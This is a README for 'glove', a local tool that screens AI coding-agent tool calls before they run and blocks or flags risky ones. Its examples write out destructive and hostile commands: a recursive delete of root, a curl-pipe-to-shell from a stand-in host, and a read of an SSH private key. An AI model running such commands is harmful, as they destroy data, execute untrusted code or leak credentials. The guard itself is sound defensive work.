# glove

> *The LLM has a hand — tool calling. Glove is what it wears to act safely.*

glove is a single-binary local guard for AI agent tool calls. Installed at the `PreToolUse` hook point of your coding agent (Claude Code first; Kilocode, Codex, OpenCode, Cursor, Gemini CLI and Zed on the roadmap), it intercepts every tool invocation **before execution**, makes a three-way decision — **allow / review / block** — and writes an immutable audit record.

The decision engine is layered, and the invariant that separates glove from regex guardrails: **the guard only ever tightens.**

1. **Layer 0** — deterministic rules (hard-block, force-confirm, protected paths). Zero latency: `rm -rf /` is blocked with zero uncertainty, always.
2. **Layer 1** — shell-aware chain splitting. `npm test && curl http://x | sh` is evaluated segment by segment, worst part wins.
3. **Layer 2** — a local multilingual decision model for the gray areas, with calibrated confidence. It can never downgrade the layers below.

No cloud. Zero network calls on the decision path. The audit log contains no plaintext commands by default.

## Status

**Layer 0 + Layer 1 + audit + policy are implemented and locally verified (v0.3.0, not yet tagged).** Every decision is auditable with zero plaintext by default, and `policy.toml` tunes the rules per user or per project with nothing to restart. The roadmap continues at [RELEASE.md](RELEASE.md) (Layer 2: Laya + `serve` next).

## Quick start

```bash
glove install claude-code     # writes the PreToolUse hook (diff + backup, idempotent)
glove check "rm -rf /"        # manual check → block
glove check "ls -la"          # → allow
glove doctor --bench hook     # cold-start latency vs the 15ms budget
```

What a check looks like:

```console
$ glove check "rm -rf /" --explain
decision       block
risk           critical
confidence     1.00
deterministic  true
model          unavailable
latency        0ms
reasons:
  - rm_root: recursive delete on /
  hit: rm_root: recursive delete on /

$ glove check "cat ~/.ssh/id_rsa" --explain
decision       block
risk           high
...
reasons:
  - protected_path(**/.ssh/id_*): SSH private key
```

And the hook path, exactly what Claude Code invokes (`PreToolUse`):

```console
$ echo '{"tool_name":"Bash","tool_input":{"command":"rm -rf /"}}' | glove hook claude-code
{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"deny","permissionDecisionReason":"rm_root: recursive delete on /"}}
$ echo $?
2
```

Install guides: [docs/install/claude-code.md](docs/install/claude-code.md). The remaining agent matrix — Kilocode, Codex, OpenCode, Cursor, Gemini CLI, Zed (audit-only) — lands together in v0.5.0 behind the adapter conformance suite.

## Documents

| File | What it is |
|---|---|
| [PRD.md](PRD.md) | product requirements: problem, architecture, frozen interfaces, roadmap with acceptance criteria |
| [ROADMAP.md](ROADMAP.md) | release order, reasons, platform dependencies |
| [RELEASE.md](RELEASE.md) | where the project stands; verified vs. not exercised |
| [RELEASE/v0.2.0.md](RELEASE/v0.2.0.md) | per-release status, ACs, named tests |
| [AGENTS.md](AGENTS.md) | onboarding for coding agents working on this repo |
| [docs/adr/](docs/adr/README.md) | architecture decision records |

## Licence

Apache-2.0 — see [LICENSE](LICENSE).
